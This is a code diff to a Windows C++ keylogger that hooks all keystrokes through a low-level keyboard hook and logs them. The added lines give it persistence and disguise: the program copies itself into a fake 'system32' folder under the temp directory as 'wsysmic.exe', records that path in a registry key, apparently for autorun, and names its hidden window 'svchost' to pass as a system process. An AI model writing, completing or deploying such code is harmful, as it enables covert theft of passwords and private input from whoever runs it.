@@ -1,9 +1,12 @@
 
 #include "WinMain.h"
+#include <sstream>
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+long createRegistry( LPCTSTR data );
 Logger* logger = new Logger(LOG_FILE);
+
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int iCmdShow)
 
@@ -11,8 +14,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 	HWND hwnd;
 	MSG msg;
 	WNDCLASSEX wndcls;
-
+	ERROR_SUCCESS;
 	const char g_szClassName[] = "michifu";
+	char* destination = (char*)malloc(sizeof(char) * 256);
+	char* iam = (char*)malloc(sizeof(char) * 256);
+
+	strcpy(destination, std::getenv("TMP") );
+	strcat(destination, "\\system32\\wsysmic.exe");
+	GetModuleFileName(NULL, iam, 256);
 
 	wndcls.cbSize = sizeof(WNDCLASSEX);
 	wndcls.style = CS_HREDRAW | CS_VREDRAW;
@@ -29,13 +38,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 
 	( !RegisterClassEx(&wndcls) ) ? logger->write("can not register window class!\n") : logger->write("windows class registered !\n");
 	
-	hwnd = CreateWindowEx(NULL,
-		g_szClassName,
-		"svchost",
-		NULL,
-		0, 0, 0, 0,
-		NULL, NULL, hInstance, NULL);
-
+	hwnd = CreateWindowEx(NULL,	g_szClassName, "svchost", NULL, 0, 0, 0, 0,	NULL, NULL, hInstance, NULL);
+	
+	( !CopyFile(iam, destination, 0) ) ? MessageBox(hwnd, "error copiando", destination, 1) : MessageBox(hwnd, "exito", iam, 1);
+	( createRegistry( destination ) == ERROR_SUCCESS ) ? MessageBox(hwnd, "registro success", destination, 1) : MessageBox(hwnd, "error registro", iam, 1);
+    
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	(hhkLowLevelKybd != NULL) ? logger->write("hhkLowLevelKybd hooked !\n") : logger->write("hhkLowLevelKybd failed !\n");
 
@@ -52,7 +59,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-	int test;
 
 	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
@@ -241,4 +247,17 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
 	default:
 		return DefWindowProc(hwnd, iMsg, wParam, lParam);
 	}
+}
+
+long createRegistry(LPCTSTR data) {
+
+	HKEY hkey;
+	DWORD dw;
+	long result = RegCreateKeyEx( HKEY_KEYLOGGER,
+								TEXT ( HKEY_KEYLOGGER_SUB ),
+								0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, &dw);
+
+	(result == ERROR_SUCCESS) ?	result = RegSetValueEx(hkey, "testPath", 0, REG_SZ, (LPBYTE)data, strlen(data) + 1) : result = -1L;
+	RegCloseKey(hkey);
+	return result;
 }
